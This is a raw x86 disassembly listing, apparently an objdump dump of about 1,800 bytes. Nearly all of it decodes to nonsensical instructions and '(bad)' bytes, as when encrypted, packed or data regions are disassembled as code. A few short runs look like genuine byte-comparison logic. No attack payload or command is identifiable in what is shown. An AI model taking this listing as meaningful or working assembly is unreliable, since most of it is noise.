  410b62:	and    ch,BYTE PTR [esi+0x78c3b0c7]
  410b68:	adc    edi,DWORD PTR [ecx]
  410b6a:	adc    cl,BYTE PTR [eax+ecx*4]
  410b6d:	xchg   ebp,eax
  410b6e:	mov    ch,0x97
  410b70:	fcomp  DWORD PTR [edx]
  410b72:	and    DWORD PTR [ebx+ecx*4+0x16],edx
  410b76:	pop    esp
  410b77:	cli    
  410b78:	ret    0xa60a
  410b7b:	int    0x61
  410b7d:	rcr    dh,0xd2
  410b80:	aam    0x46
  410b82:	shr    BYTE PTR [edx],cl
  410b84:	(bad)  
  410b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b86:	push   ss
  410b87:	jmp    0x410b8f
  410b89:	and    cl,BYTE PTR [edx]
  410b8b:	popf   
  410b8c:	fdivr  QWORD PTR [eax]
  410b8e:	mov    ecx,0x674d7111
  410b93:	add    ch,BYTE PTR [ebx+0x1]
  410b96:	push   ebp
  410b97:	clc    
  410b98:	push   cs
  410b99:	stos   DWORD PTR es:[edi],eax
  410b9a:	mov    BYTE PTR [ebx],bl
  410b9c:	mov    eax,0x89d26a68
  410ba1:	inc    edx
  410ba2:	mov    es,WORD PTR [eax+0x4b]
  410ba5:	dec    eax
  410ba6:	jbe    0x410bd5
  410ba8:	sbb    eax,0xb7c53deb
  410bad:	or     eax,DWORD PTR [eax*4+0x159e1569]
  410bb4:	jecxz  0x410b50
  410bb6:	dec    esi
  410bb7:	and    al,0xf9
  410bb9:	mov    eax,0x614f815f
  410bbe:	mov    es,WORD PTR [edi-0x557120aa]
  410bc4:	push   edi
  410bc5:	enter  0x984f,0x39
  410bc9:	add    BYTE PTR [esi+0x74],ch
  410bcc:	mov    ebp,0x5fc1a41e
  410bd1:	inc    ecx
  410bd2:	push   es
  410bd3:	jae    0x410c53
  410bd5:	xor    bh,BYTE PTR [ebx-0x62f0f3af]
  410bdb:	pop    edi
  410bdc:	mov    esi,0x5b38a18c
  410be1:	cld    
  410be2:	and    DWORD PTR [esi+edx*1+0x52330c99],ebp
  410be9:	xor    BYTE PTR [esi-0x1d],0xb5
  410bed:	mov    esi,0x94e0e01e
  410bf2:	dec    edi
  410bf3:	adc    bl,BYTE PTR ss:[edx+0xd44a254]
  410bfa:	inc    eax
  410bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bfc:	outs   dx,DWORD PTR ds:[esi]
  410bfd:	or     al,0xbd
  410bff:	mov    ch,0xb7
  410c01:	into   
  410c02:	and    cl,BYTE PTR [eax+0x7a]
  410c05:	lahf   
  410c06:	fs jg  0x410bc3
  410c09:	lods   al,BYTE PTR ds:[esi]
  410c0a:	scas   eax,DWORD PTR es:[edi]
  410c0b:	push   ds
  410c0c:	push   0xffffffc2
  410c0e:	(bad)  
  410c0f:	rcl    DWORD PTR [eax+0x7d587b28],0x17
  410c16:	aam    0xf5
  410c18:	cdq    
  410c19:	lock ss jae 0x410c5f
  410c1d:	hlt    
  410c1e:	jmp    0x978a:0x74ec7f6c
  410c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c26:	mov    edi,0x83fa3830
  410c2b:	xchg   edi,eax
  410c2c:	in     eax,dx
  410c2d:	and    al,0x73
  410c2f:	loope  0x410bce
  410c31:	gs test eax,0xb4a32ba5
  410c37:	cmp    BYTE PTR [ebx+edx*8+0x1e3d64b3],cl
  410c3e:	mov    WORD PTR [esi-0x74],?
  410c41:	add    al,BYTE PTR [eax+0x7f]
  410c44:	or     BYTE PTR [esi-0x1d],dh
  410c47:	xchg   BYTE PTR [esi],dl
  410c49:	std    
  410c4a:	pop    ds
  410c4b:	nop
  410c4c:	mov    edx,0x7deaab0
  410c51:	jecxz  0x410cc4
  410c53:	and    BYTE PTR [eax+0x74],dl
  410c56:	inc    ebp
  410c57:	sub    cl,dh
  410c59:	jns    0x410cb8
  410c5b:	add    DWORD PTR [ebp-0x30190bcd],eax
  410c61:	(bad)  
  410c63:	out    0x76,eax
  410c65:	pop    edx
  410c66:	loope  0x410ca7
  410c68:	inc    ebp
  410c69:	inc    esp
  410c6a:	scas   eax,DWORD PTR es:[edi]
  410c6b:	sbb    al,0x25
  410c6d:	add    cl,al
  410c6f:	push   ebx
  410c70:	out    dx,eax
  410c71:	inc    esi
  410c72:	jp     0x410cbb
  410c74:	push   ecx
  410c75:	adc    ah,BYTE PTR [edi+0x40816864]
  410c7b:	js     0x410c29
  410c7d:	jnp    0x410cb8
  410c7f:	xchg   esp,eax
  410c80:	xchg   edx,eax
  410c81:	xchg   BYTE PTR [edi-0x7d],ah
  410c84:	scas   eax,DWORD PTR es:[edi]
  410c85:	call   0x539f:0xe31d61a4
  410c8c:	cmp    BYTE PTR [ebx+0x65],0x9c
  410c90:	sub    BYTE PTR [ebp+0x3642fcfb],ch
  410c96:	fld    st(5)
  410c98:	into   
  410c99:	into   
  410c9a:	repz xchg ebp,eax
  410c9c:	mov    cs,WORD PTR [edi+0x4a502043]
  410ca2:	imul   edi,DWORD PTR [edi+esi*8],0x3efa9ca4
  410ca9:	scas   eax,DWORD PTR es:[edi]
  410caa:	mov    bl,0x60
  410cac:	push   esi
  410cad:	retf   
  410cae:	or     BYTE PTR [esi-0x4],ah
  410cb1:	or     ebp,0x31
  410cb4:	cld    
  410cb5:	retf   0xba99
  410cb8:	(bad)  
  410cb9:	not    DWORD PTR [edi-0x3]
  410cbc:	mov    ebx,0x58434ce6
  410cc1:	pusha  
  410cc2:	arpl   WORD PTR [ebp-0x38],sp
  410cc5:	xor    dl,BYTE PTR [edi]
  410cc7:	enter  0x5271,0x93
  410ccb:	loope  0x410cf3
  410ccd:	sbb    al,0xe6
  410ccf:	cmp    DWORD PTR [ebx],0x8
  410cd2:	repnz mov ebp,0xd7fb2cba
  410cd8:	jge    0x410cb6
  410cda:	xchg   esp,eax
  410cdb:	lea    esp,[esi]
  410cdd:	jo     0x410c9b
  410cdf:	lds    edi,FWORD PTR [edi+0x7]
  410ce2:	jns    0x410cd9
  410ce4:	popf   
  410ce5:	ja     0x410ca5
  410ce7:	sbb    BYTE PTR [ebx-0x61],dl
  410cea:	add    ecx,DWORD PTR [ecx+eax*2]
  410ced:	inc    esp
  410cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cf0:	or     al,0x20
  410cf2:	pop    eax
  410cf3:	ret    0x3a51
  410cf6:	sbb    BYTE PTR [eax-0x4d],al
  410cf9:	sbb    eax,0x6b190e23
  410cfe:	and    eax,0xaf0b119d
  410d03:	mov    eax,0xc0f7229a
  410d08:	int3   
  410d09:	jno    0x410d43
  410d0b:	jnp    0x410c96
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xfe957e9c
  410d25:	fwait
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410cc5
  410d2f:	push   esp
  410d30:	inc    esp
  410d31:	aas    
  410d32:	pop    esi
  410d33:	dec    ebx
  410d34:	mov    edi,0x531575cb
  410d39:	push   ebp
  410d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d3b:	push   edi
  410d3c:	ficom  DWORD PTR [edi+0x1c]
  410d3f:	xchg   edx,eax
  410d40:	push   ebx
  410d41:	mov    cs,esi
  410d43:	hlt    
  410d44:	sub    bl,ch
  410d46:	push   eax
  410d47:	xchg   edi,eax
  410d48:	pop    ds
  410d49:	ds cmp eax,0xc016ca0d
  410d4f:	or     al,0x4e
  410d51:	pop    ss
  410d52:	loop   0x410dbb
  410d54:	mov    al,0xb
  410d56:	rcr    al,0x43
  410d59:	(bad)  
  410d5a:	stos   DWORD PTR es:[edi],eax
  410d5b:	sbb    dh,BYTE PTR [ebx+0x7d]
  410d5e:	jmp    DWORD PTR [ebp+0x2b497784]
  410d64:	or     ah,bh
  410d66:	mov    DWORD PTR [eax-0x361326b1],esp
  410d6c:	pop    ds
  410d6d:	sar    ch,0x6f
  410d70:	fs out 0xa8,eax
  410d73:	jl     0x410d09
  410d75:	cmp    BYTE PTR [esi],bl
  410d77:	cmp    esp,DWORD PTR [ebx-0x74]
  410d7a:	fist   DWORD PTR [ebp+0x43]
  410d7d:	ret    0xa85b
  410d80:	pop    edi
  410d81:	rcr    eax,0x1
  410d84:	mov    dl,0x4c
  410d86:	pop    edi
  410d87:	xchg   esp,eax
  410d88:	push   eax
  410d89:	dec    eax
  410d8a:	mov    al,0x5
  410d8c:	iret   
  410d8d:	inc    esi
  410d8e:	sbb    DWORD PTR [ecx-0x13b0351c],ecx
  410d94:	lods   eax,DWORD PTR ds:[esi]
  410d95:	addr16 pop edi
  410d97:	or     al,0xa2
  410d99:	(bad)  
  410d9a:	scas   eax,DWORD PTR es:[edi]
  410d9b:	js     0x410e09
  410d9d:	js     0x410de1
  410d9f:	mov    ah,BYTE PTR [esi]
  410da1:	add    esp,esi
  410da3:	js     0x410d6a
  410da5:	test   BYTE PTR [ebp-0x67],0x74
  410da9:	cld    
  410daa:	sbb    al,bl
  410dac:	dec    ebx
  410dad:	cmp    dl,ch
  410daf:	cmp    eax,0x9f38b0cf
  410db4:	jle    0x410d54
  410db6:	in     al,dx
  410db7:	not    BYTE PTR [edi-0x209b02e9]
  410dbd:	les    edx,FWORD PTR [esp+eiz*2+0x55c8b367]
  410dc4:	mov    edx,0x4e4b297c
  410dc9:	mov    al,0x11
  410dcb:	inc    esi
  410dcc:	mov    eax,ds:0x41f4403b
  410dd1:	dec    BYTE PTR ds:0xcac01dec
  410dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dd8:	dec    eax
  410dd9:	sti    
  410dda:	sti    
  410ddb:	mov    ecx,0x779c8441
  410de0:	cmp    bh,BYTE PTR [ebp-0x776da95b]
  410de6:	es sahf 
  410de8:	dec    ebp
  410de9:	xlat   BYTE PTR ds:[ebx]
  410dea:	pop    DWORD PTR [eax]
  410dec:	rol    DWORD PTR [eax],0x17
  410def:	shl    DWORD PTR [edx],cl
  410df1:	push   ebx
  410df2:	push   edx
  410df3:	lods   al,BYTE PTR ds:[esi]
  410df4:	cmp    dh,BYTE PTR [eax+0x68]
  410df7:	add    BYTE PTR [edi+0x5c59583a],0x92
  410dfe:	retf   0xdca2
  410e01:	(bad)  
  410e02:	(bad)  
  410e03:	jge    0x410d95
  410e05:	push   esi
  410e06:	mov    esp,0x4c8db73f
  410e0b:	ret    0xcc07
  410e0e:	rcr    BYTE PTR [eax],cl
  410e10:	sahf   
  410e11:	aam    0x1b
  410e13:	test   BYTE PTR [esi+0xee6cd37],al
  410e19:	pop    dx
  410e1b:	xor    BYTE PTR [esi],al
  410e1d:	and    DWORD PTR [esp+ecx*2-0x6e],ebp
  410e21:	push   edi
  410e22:	ror    DWORD PTR [eax],0xaf
  410e25:	addr16 push ebp
  410e27:	mov    al,0x5d
  410e29:	imul   edx,edx,0xd78b0f36
  410e2f:	nop
  410e30:	enter  0x8120,0x52
  410e34:	aas    
  410e35:	cmc    
  410e36:	mov    al,0xe2
  410e38:	dec    ebp
  410e39:	dec    edx
  410e3a:	rol    edi,cl
  410e3c:	mov    edi,0x82fb256d
  410e41:	pop    ecx
  410e42:	iret   
  410e43:	jmp    0xb4ba:0x3376e018
  410e4a:	aam    0x7c
  410e4c:	or     BYTE PTR [eax+0x3d],0xd0
  410e50:	in     al,dx
  410e51:	sub    al,0xe4
  410e53:	and    cl,ah
  410e55:	xor    edx,edi
  410e57:	pop    esi
  410e58:	adc    edi,DWORD PTR [edi-0x5e347f2a]
  410e5e:	outs   dx,BYTE PTR ds:[esi]
  410e5f:	cmp    cl,cl
  410e61:	xor    dh,ah
  410e63:	lds    esi,FWORD PTR [ebx+edi*8-0x69ba568]
  410e6a:	pop    es
  410e6b:	scas   al,BYTE PTR es:[edi]
  410e6c:	push   esp
  410e6d:	inc    ebp
  410e6e:	xor    BYTE PTR [edi+eax*1+0xe752312],bl
  410e75:	pop    esi
  410e76:	mov    ah,0x5c
  410e78:	mov    ch,0x1c
  410e7b:	ret    
  410e7c:	inc    edx
  410e7d:	jmp    0x410e6b
  410e7f:	sar    BYTE PTR [esi-0x1c1e9870],cl
  410e85:	mov    cl,0xed
  410e87:	fdivrp st(1),st
  410e89:	rol    DWORD PTR gs:[ebp-0x660d0e6b],1
  410e90:	inc    edx
  410e91:	lahf   
  410e92:	adc    BYTE PTR [edx-0x567af10b],dl
  410e98:	rol    bh,1
  410e9a:	or     BYTE PTR [ecx+0x38],al
  410e9d:	mov    bl,0x66
  410e9f:	sbb    BYTE PTR [esi+0x217e7a2c],bl
  410ea5:	loopne 0x410eec
  410ea7:	outs   dx,DWORD PTR ds:[esi]
  410ea8:	(bad)  
  410ea9:	adc    edi,DWORD PTR [edx+ebx*1+0x10ef3741]
  410eb0:	int3   
  410eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eb2:	lds    esp,FWORD PTR [ecx+0x1055c88]
  410eb8:	pop    edi
  410eb9:	or     edx,DWORD PTR [eax-0x419c60bb]
  410ebf:	or     BYTE PTR [edi],0xb6
  410ec2:	push   esi
  410ec3:	mov    BYTE PTR [ecx-0x35530c08],ah
  410ec9:	test   al,0xb2
  410ecb:	fimul  WORD PTR ds:0x50569e32
  410ed1:	cmp    al,0x5b
  410ed3:	in     al,dx
  410ed4:	dec    edi
  410ed5:	outs   dx,BYTE PTR ds:[esi]
  410ed6:	aam    0x45
  410ed8:	xor    bl,ch
  410eda:	dec    esi
  410edb:	pop    ds
  410edc:	scas   al,BYTE PTR es:[edi]
  410edd:	repnz dec edi
  410edf:	rcl    DWORD PTR [esi+ebp*2+0x72016a3e],cl
  410ee6:	xchg   ecx,eax
  410ee7:	mov    ecx,0x60166eb7
  410eec:	in     eax,dx
  410eed:	mov    DWORD PTR [ecx-0x3b67165e],ebp
  410ef3:	jae    0x410ecf
  410ef5:	adc    dh,BYTE PTR [esi+0xc]
  410ef8:	int3   
  410ef9:	jno    0x410e86
  410efb:	mov    ds:0x6038f412,eax
  410f00:	(bad)  
  410f01:	nop
  410f02:	push   esp
  410f03:	daa    
  410f04:	cdq    
  410f05:	fsubr  st,st(4)
  410f07:	(bad)  
  410f08:	popa   
  410f09:	ja     0x410ed6
  410f0b:	loopne 0x410f1c
  410f0d:	iret   
  410f0e:	mov    ds:0x3cefd8d8,al
  410f13:	xchg   esp,eax
  410f14:	jecxz  0x410f65
  410f16:	pop    edx
  410f17:	xchg   esi,eax
  410f18:	hlt    
  410f19:	aaa    
  410f1a:	(bad)  [ebx+edx*2+0x7f]
  410f1e:	das    
  410f1f:	lds    edx,FWORD PTR [edi+0x13]
  410f22:	dec    eax
  410f23:	in     al,0xf5
  410f25:	rcl    DWORD PTR [esi+ecx*1],1
  410f28:	ins    DWORD PTR es:[edi],dx
  410f29:	pop    ebp
  410f2a:	sbb    DWORD PTR [edx-0x28],ebp
  410f2d:	and    al,0xf5
  410f2f:	sub    dl,BYTE PTR [ebx+0x71e9c782]
  410f35:	and    ebx,DWORD PTR [esi-0x3cf1073]
  410f3b:	aaa    
  410f3c:	mov    eax,ds:0xc33b2dfb
  410f41:	nop
  410f42:	sbb    ebx,DWORD PTR [edx+0x41]
  410f45:	cmp    esi,eax
  410f47:	gs out 0xf0,eax
  410f4a:	adc    DWORD PTR ds:0x3f9bab01,esi
  410f50:	jns    0x410f9f
  410f52:	cmp    bl,BYTE PTR [ebp+edx*2+0x53]
  410f56:	retf   0x12d7
  410f59:	inc    ebp
  410f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f5b:	push   edi
  410f5c:	and    DWORD PTR [esi+0x71e75fc6],ebx
  410f62:	cs ins DWORD PTR es:[edi],dx
  410f64:	dec    ebx
  410f65:	inc    esi
  410f66:	sar    BYTE PTR [edi],1
  410f68:	jecxz  0x410eec
  410f6a:	sub    BYTE PTR [edi-0x647b3c68],al
  410f70:	add    dh,ch
  410f72:	fcomp  DWORD PTR [edi-0x20]
  410f75:	out    0x4f,eax
  410f77:	dec    ecx
  410f78:	add    eax,0x29b346b3
  410f7d:	xchg   ebp,eax
  410f7e:	aaa    
  410f7f:	cmp    ecx,DWORD PTR [ebx]
  410f81:	mov    esp,0xb61c0abc
  410f86:	or     al,0xe3
  410f88:	xchg   DWORD PTR [eax+0x5f],ebp
  410f8b:	adc    eax,0xcd14922a
  410f90:	jle    0x410f29
  410f92:	int    0x51
  410f94:	(bad)  
  410f95:	sbb    al,0x8d
  410f97:	imul   esi,DWORD PTR [esi-0x7971debe],0xffffffa1
  410f9e:	adc    esi,ebp
  410fa0:	jno    0x410f63
  410fa2:	xchg   ecx,eax
  410fa3:	pushf  
  410fa4:	inc    ebp
  410fa5:	jle    0x410fc4
  410fa7:	loope  0x410f3d
  410fa9:	or     eax,0x5bb15e9e
  410fae:	out    0xc7,al
  410fb0:	out    dx,al
  410fb1:	inc    edi
  410fb2:	inc    edx
  410fb3:	addr16 xchg ebx,eax
  410fb5:	cmp    al,0x3b
  410fb7:	mov    ah,0x40
  410fb9:	dec    edx
  410fba:	pushf  
  410fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fbc:	fcmovne st,st(0)
  410fbe:	push   ss
  410fbf:	mov    esi,0xbb066571
  410fc4:	cmp    BYTE PTR [ebx+ebx*2],dh
  410fc7:	shr    DWORD PTR [esi],1
  410fc9:	or     dl,BYTE PTR [edx-0x676ddee5]
  410fcf:	adc    BYTE PTR [eax+edi*2+0x66],bl
  410fd3:	adc    al,0x9f
  410fd5:	cdq    
  410fd6:	jp     0x410f78
  410fd8:	pusha  
  410fd9:	or     BYTE PTR [edi+0x4e],bl
  410fdc:	mov    ebx,0xc133ba32
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fd0
  41102b:	sti    
  41102c:	dec    edx
  41102d:	out    0x18,al
  41102f:	inc    edi
  411030:	jle    0x4110b0
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x41107b
  411037:	xchg   ecx,eax
  411038:	push   0xc3d29e99
  41103d:	repnz and BYTE PTR cs:0xa99f9671,bl
  411045:	loope  0x410ff9
  411047:	rol    DWORD PTR [ebx-0x34],cl
  41104a:	and    eax,0xc55dcf5c
  41104f:	add    ebx,DWORD PTR [eax-0x26667e91]
  411055:	outs   dx,BYTE PTR ds:[esi]
  411056:	jnp    0x411096
  411058:	sbb    eax,0x507eca04
  41105d:	call   0xccec:0x97cb0149
  411064:	push   ebp
  411065:	addr16 lock enter 0x627e,0x54
  41106b:	jecxz  0x411012
  41106d:	mov    ebx,0x28e48e1c
  411072:	in     eax,0xb5
  411074:	xor    eax,0x1039407e
  411079:	xor    BYTE PTR es:[eax],0xdb
  41107d:	mov    al,dh
  41107f:	xchg   esi,eax
  411080:	or     eax,0x604e5d3e
  411085:	mov    esi,0xa9b15d00
  41108a:	mov    ah,0x7f
  41108c:	inc    edx
  41108d:	into   
  41108e:	js     0x4110c1
  411090:	dec    edi
  411091:	cwde   
  411092:	cmp    al,0xa0
  411094:	mov    ch,0x5e
  411096:	sub    cl,BYTE PTR [eax+0x25]
  411099:	cld    
  41109a:	dec    ebp
  41109b:	push   ecx
  41109c:	aam    0xc8
  41109e:	mov    ecx,0xbc893c50
  4110a3:	mov    al,0x97
  4110a5:	cpuid  
  4110a7:	pop    esi
  4110a8:	mov    ebx,DWORD PTR [eax]
  4110aa:	enter  0xb52e,0x9c
  4110ae:	aam    0xc
  4110b0:	lods   al,BYTE PTR ds:[esi]
  4110b1:	outs   dx,DWORD PTR ds:[esi]
  4110b2:	pop    es
  4110b3:	ss enter 0x8b5e,0x62
  4110b8:	mov    ah,BYTE PTR [ebx-0x52]
  4110bb:	std    
  4110bc:	dec    eax
  4110bd:	test   BYTE PTR [esi-0x38],cl
  4110c0:	das    
  4110c1:	mov    dh,0x25
  4110c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c4:	jle    0x41112d
  4110c6:	dec    ebx
  4110c7:	jge    0x41109f
  4110c9:	dec    ecx
  4110ca:	ret    0x8ffa
  4110cd:	mov    ecx,0x33708988
  4110d2:	jge    0x411066
  4110d4:	std    
  4110d5:	fnsave ds:0x173d1b6d
  4110db:	stos   BYTE PTR es:[edi],al
  4110dc:	push   ds
  4110dd:	mov    ch,0x90
  4110df:	inc    esp
  4110e0:	inc    edx
  4110e1:	pop    ss
  4110e2:	imul   edx,ebp,0xb35ba938
  4110e8:	std    
  4110e9:	add    ebx,ecx
  4110eb:	fst    st(2)
  4110ed:	std    
  4110ee:	pop    eax
  4110ef:	call   0x7595:0x4fe08cd7
  4110f6:	sbb    BYTE PTR [ebx+esi*2+0x4c86c713],0x42
  4110fe:	jl     0x411174
  411100:	sub    DWORD PTR [esi+eax*2+0x2e],esi
  411104:	mov    eax,0xcb246b3b
  411109:	in     al,dx
  41110a:	fcmovnu st,st(7)
  41110c:	in     al,0x63
  41110e:	in     eax,0xa8
  411110:	pop    esp
  411111:	jno    0x41116b
  411113:	les    edx,FWORD PTR [edi-0x19]
  411116:	sete   BYTE PTR [esi]
  411119:	ja     0x411141
  41111b:	jbe    0x4110d5
  41111d:	xchg   BYTE PTR [ebx-0x484af3b1],dl
  411123:	mov    DWORD PTR [esi*4-0x610a3db0],ebx
  41112a:	(bad)  
  41112c:	mov    esp,0x7d8f47e9
  411131:	test   DWORD PTR [edx+0x16681dfd],edi
  411137:	xchg   esp,eax
  411138:	or     bh,cl
  41113a:	outs   dx,BYTE PTR ds:[esi]
  41113b:	into   
  41113c:	(bad)  
  41113d:	pusha  
  41113e:	ficomp WORD PTR [esi-0x67]
  411141:	int    0xb0
  411143:	xor    BYTE PTR [edi-0xdfe72f0],cl
  411149:	mov    ch,0xbc
  41114b:	bound  edx,QWORD PTR [eax]
  41114d:	rol    edi,1
  41114f:	test   BYTE PTR [eax+0xe4a7d40],dh
  411155:	xor    BYTE PTR [ecx],ah
  411157:	sahf   
  411158:	call   0x7784:0x48845e6d
  41115f:	setl   BYTE PTR [ecx]
  411162:	jbe    0x411161
  411164:	push   ebx
  411165:	jb     0x41111f
  411167:	pop    eax
  411168:	pop    esp
  411169:	in     al,dx
  41116a:	jecxz  0x4111ad
  41116c:	stc    
  41116d:	mov    ds:0x6a7f6178,al
  411172:	add    al,BYTE PTR [ebx]
  411174:	pusha  
  411175:	dec    ebx
  411176:	cmp    esi,DWORD PTR [edx+0x7b]
  411179:	retf   
  41117a:	jne    0x411138
  41117c:	jge    0x4111d8
  41117e:	inc    ebx
  41117f:	xor    al,0x5
  411181:	or     DWORD PTR ds:0x97cbd743,ebx
  411187:	retf   
  411188:	inc    eax
  411189:	je     0x41119e
  41118b:	stos   DWORD PTR es:[edi],eax
  41118c:	xor    esp,ecx
  41118e:	xchg   esi,eax
  41118f:	sbb    eax,0x401e2668
  411194:	dec    edi
  411195:	shl    DWORD PTR [ebx],0x71
  411198:	imul   esp,DWORD PTR [ebp-0x7c4f03e4],0x3c
  41119f:	cmp    BYTE PTR [ecx+0x107f1bf9],dh
  4111a5:	jnp    0x4111b2
  4111a7:	or     eax,0xa393c987
  4111ac:	loop   0x4111ef
  4111ae:	mov    ebp,0xcdb3b996
  4111b3:	xor    al,0x5a
  4111b5:	inc    ebx
  4111b6:	arpl   WORD PTR [ebx+edi*2+0x61],si
  4111ba:	inc    eax
  4111bb:	(bad)  
  4111bd:	mov    ds:0xa1cb340d,eax
  4111c2:	sar    DWORD PTR [edx-0x70848f5],0xce
  4111c9:	jae    0x411187
  4111cb:	lds    edx,FWORD PTR ds:0x6ecdcf8b
  4111d1:	and    ecx,DWORD PTR [esi]
  4111d3:	xlat   BYTE PTR ds:[ebx]
  4111d4:	add    eax,0x970d3800
  4111d9:	mov    ecx,ebp
  4111db:	dec    ebx
  4111dc:	test   al,0xcb
  4111de:	or     dh,BYTE PTR [edx-0x450d923]
  4111e4:	add    BYTE PTR [esi-0x3d],cl
  4111e7:	lock push es
  4111e9:	aad    0x69
  4111eb:	test   al,dl
  4111ed:	and    DWORD PTR [eax],esp
  4111ef:	shl    BYTE PTR [ecx-0x23],cl
  4111f2:	cmp    al,0xc0
  4111f4:	out    0x78,al
  4111f6:	inc    esi
  4111f7:	leave  
  4111f8:	cmovl  esi,DWORD PTR ds:0x9bb8658c
  4111ff:	iret   
  411200:	xchg   edx,eax
  411201:	sub    eax,0x74172293
  411206:	mov    esi,0x347a069e
  41120b:	jle    0x411281
  41120d:	adc    al,0xa0
  41120f:	aam    0x86
  411211:	repnz or al,0x81
  411214:	fwait
  411215:	sub    al,0x14
  411217:	nop
  411218:	push   0xffffff95
  41121a:	fwait
  41121b:	xchg   esp,eax
  41121c:	pusha  
  41121d:	sub    bh,dh
  41121f:	dec    edx
  411220:	cdq    
  411221:	cld    
  411222:	pop    ss
  411223:	into   
  411224:	jns    0x41125a
  411226:	dec    esi
  411227:	cmp    BYTE PTR [eax+0x1],al
  41122a:	leave  
  41122b:	push   ecx
  41122c:	push   edx
  41122d:	gs cwde 
  41122f:	ins    DWORD PTR es:[edi],dx
  411230:	add    eax,0xfeb5d818
  411235:	loopne 0x41124e
  411237:	test   al,0x60
  411239:	iret   
  41123a:	xchg   ebx,ecx
  41123c:	loopne 0x4111e6
  41123e:	push   0xe00e6d84
  411243:	adc    eax,0x2931d6a0
  411248:	sbb    bl,0xfd
  41124b:	daa    
  41124c:	mov    ch,0x3c
  41124e:	sub    ah,dh
  411250:	xor    esi,0x67
  411253:	hlt    
  411254:	dec    edx
  411255:	retf   0x7939
  411258:	pop    ds
  411259:	jo     0x411251
  41125b:	fmul   st,st(2)
  41125d:	loop   0x411271
  41125f:	xchg   BYTE PTR [esi-0x5e],cl
  411262:	xor    bl,BYTE PTR [ebx-0x4e]
  411265:	pop    eax
  411266:	mov    al,ds:0x5fd56c43
  41126b:	in     eax,dx
  41126c:	pop    ebx
  41126d:	mov    dl,0xc7
  41126f:	dec    eax
  411270:	retf   0x8ced
  411273:	das    
  411274:	mov    bh,BYTE PTR [ecx+ecx*8-0x2f]
  411278:	pop    ebp
  411279:	aam    0xb2
  41127b:	pop    ebp
  41127c:	dec    ebp
  41127d:	dec    ecx
  41127e:	xchg   ebx,eax
  41127f:	jecxz  0x41127c
  411281:	and    DWORD PTR ds:0x55fd338c,esi
  411287:	adc    BYTE PTR [ebp+0x1a281c46],0x97
  41128e:	mov    eax,ds:0xef4d7928
  411293:	cdq    
  411294:	cli    
  411295:	inc    esp
  411296:	sbb    al,0x74
  411298:	ror    esi,cl
  41129a:	in     al,dx
  41129b:	push   ebp
  41129c:	call   0xcd2b162b
  4112a1:	mov    edx,0x12f19716
  4112a6:	jl     0x411305
  4112a8:	push   ds
  4112a9:	xchg   ebx,eax
  4112aa:	xchg   esi,eax
  4112ab:	and    dh,BYTE PTR [esi-0xe701a9e]
  4112b1:	(bad)  
  4112b2:	lds    ebx,FWORD PTR [edi+eax*8+0x1f496ced]
  4112b9:	mov    esi,0xbc6d9882
  4112be:	in     al,0x79
  4112c0:	cs mov edx,0x7b8cc98d
  4112c6:	lods   al,BYTE PTR ds:[esi]
  4112c7:	and    ebx,eax
  4112c9:	cmp    al,0x18
  4112cb:	jecxz  0x411335
  4112cd:	je     0x41124f
  4112cf:	retf   
  4112d0:	(bad)  [edx]
  4112d2:	and    ebx,0xd265c4d0
  4112d8:	dec    ebp
  4112d9:	ror    BYTE PTR [ebx],0x2b
  4112dc:	jl     0x41130f
  4112de:	ds jp  0x41129f
  4112e1:	call   0xf7f:0x61e4360a
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x3668f61e,eax
  411318:	dec    ebx
  411319:	stos   BYTE PTR es:[edi],al
  41131a:	add    cl,BYTE PTR [ecx+0x45]
